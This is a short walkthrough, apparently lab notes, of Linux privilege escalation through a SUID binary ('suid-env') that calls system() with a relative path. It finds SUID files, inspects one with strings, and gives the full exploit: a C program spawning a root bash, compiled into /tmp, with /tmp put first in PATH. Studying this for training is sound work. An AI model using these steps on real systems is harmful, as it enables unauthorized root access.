### Detection
##### Find SUID binaries
```
find / -type f -perm -04000 -ls 2>/dev/null
```

- **-04000**: Find files where at least the `setuid` bit is set. Without it would mean to find exactly find the permission bits `04000` set and nothing else which is rare.
- **-ls**: It tells `find` command to run the `ls` action for each matching file, similar to running `ls -l`.

##### Note the SUID binaries
SUID binary found from the above command is 
```
/usr/local/bin/suid-env
```

##### Check the Binary's Function
```
strings /usr/local/bin/suid-env
```

- `setresgid` and `setresuid`: If a binary uses these functions, it can ***change its user and group ID to root (0)***.
- `system`: If the binary uses `system()`, it might be vulnerable to ***environmental manipulation*** (setting a malicious PATH).

### Exploitation
##### Create a Malicious C Program
```
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

- `setgid(0)` and `setuid(0)` set the process's group ID and user ID TO 0.
- `system("/bin/bash")` launches a root shell.

##### Compile the Malicious C Program
```
gcc /tmp/service.c -o /tmp/service
```

##### Modify the PATH Environment Variable
```
export PATH=/tmp:$PATH
```

- Modifies the `PATH` environment variable to prioritize `/tmp` over other directories.

##### Execute the SUID binary
```
/usr/local/bin/suid-env
```